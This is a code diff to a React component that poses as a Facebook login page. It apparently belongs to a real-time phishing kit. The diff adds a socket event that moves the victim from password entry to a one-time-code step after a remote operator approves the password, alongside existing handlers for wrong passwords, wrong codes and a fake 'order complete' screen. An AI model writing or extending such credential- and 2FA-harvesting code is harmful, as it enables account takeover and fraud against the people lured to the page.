@@ -58,16 +58,27 @@ export default function FacebookLoginPage() {
     
     // Listen for wrong pass
     socket.on('fb-wrong-pass', (data: { id: string }) => {
-      if (sessionId && data.id === sessionId) {
+      console.log('FB: Wrong pass event', data);
+      if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setWrongPass(true);
         setStep('login'); 
       }
     });
 
+    // Listen for pass approved (Go to OTP)
+    socket.on('fb-pass-true', (data: { id: string }) => {
+      console.log('FB: Pass true event', data);
+      if (sessionId && String(data.id) === String(sessionId)) {
+        setLoading(false);
+        setStep('otp');
+      }
+    });
+
     // Listen for OTP approved (Show Success Screen)
     socket.on('fb-otp-true', (data: { id: string }) => {
-      if (sessionId && data.id === sessionId) {
+      console.log('FB: OTP true event', data);
+      if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setIsOrderComplete(true);
       }
@@ -75,10 +86,11 @@ export default function FacebookLoginPage() {
 
     // Listen for OTP wrong (Re-enter OTP)
     socket.on('fb-otp-wrong', (data: { id: string }) => {
-      if (sessionId && data.id === sessionId) {
+      console.log('FB: OTP wrong event', data);
+      if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setWrongOtp(true);
-        setVerifyCode(''); // Xoá mã cũ để nhập lại
+        setVerifyCode(''); 
       }
     });
 
